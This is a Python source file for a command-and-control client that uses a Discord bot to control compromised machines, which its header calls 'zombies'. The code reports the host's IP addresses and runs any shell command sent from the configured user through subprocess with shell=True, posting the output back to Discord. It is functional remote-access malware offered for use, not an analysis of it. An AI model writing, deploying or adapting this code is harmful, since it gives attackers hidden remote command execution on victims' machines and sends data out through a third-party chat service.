'''
Application: c2dis.py
Author: Andrew Eng
Date: 2020-11-10

Description:
This is a c2 client that communicates via discord.  Enter in your bot token and authorized user id to command and control your zombies.

Usage: python3 c2dis.py

You can talk directly to the bot or through public chat.  If you are talking on the public chat; the command execution codes are:

@bot_name cmd <command to execute>

If you DM the bot directly, you can say "ip" to get IP address information

CTRL + C to exit the discord connection

Command executions to the bot is logged in chat.log

'''

import discord
import netifaces
from subprocess import Popen, PIPE
import datetime as dt

# Make sure you create a credentials.txt file in your home directory
keys = []
with open('credentials.txt','r') as credentials:
    for eachline in credentials:
        reading = eachline.split(' = ')
        keys.append(reading[1])
credentials.close()

token = keys[0].strip()
authorized_user = keys[1].strip()

# Get IP address info
def getIP():
    count = 0
    interfaces = netifaces.interfaces()
    listIP = []
    while count < len(interfaces):
        try:
            listIP.append(f'{interfaces[count]}: {netifaces.ifaddresses(interfaces[count])[netifaces.AF_INET]}')
            count +=1
        except:
            count +=1
    return listIP

client = discord.Client()

@client.event
async def on_ready():
    print('Logged into C2 Server')
    print('Username: ', end= '')
    print(client.user.name)
    print('Userid: ',end = '')
    print(client.user.id)
    print(f'Bot Token: {token}')
    print(f'Authorized User: {authorized_user}')
    print('CTRL + C to exit')
@client.event
async def on_message(message):

    if message.author.id == client.user.id:
        return

    if message.content.startswith('ip'):
        myIP = getIP()
        count = 0
        while count < len(myIP):
            await message.channel.send(myIP[count])
            count +=1
        await message.channel.send('.... waiting for next commands')

    if message.content.startswith(authorized_user):
        # split the messages and create a list
        msg = message.content.split(' ')

        # Create chat log
        with open('chat.log','a') as log:
            log.write(f'{dt.datetime.now()}, [public], {message.content}\n')
        log.close()
        
        cmd = ' '.join(msg[2:len(msg)])

        # Second validation; just making sure the right person is sending commands 
        if msg[0] == authorized_user:
            stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
            output = stdout.read().decode('utf-8').split('\n')
            for eachline in output:
                if bool(eachline) == True:
                    await message.channel.send(eachline)
        else:
            await message.channel.send('... Sorry, you are not authorized to send commands')

    else:
        await message.channel.send('... I think you are talking to the wrong bot.')

client.run(token)

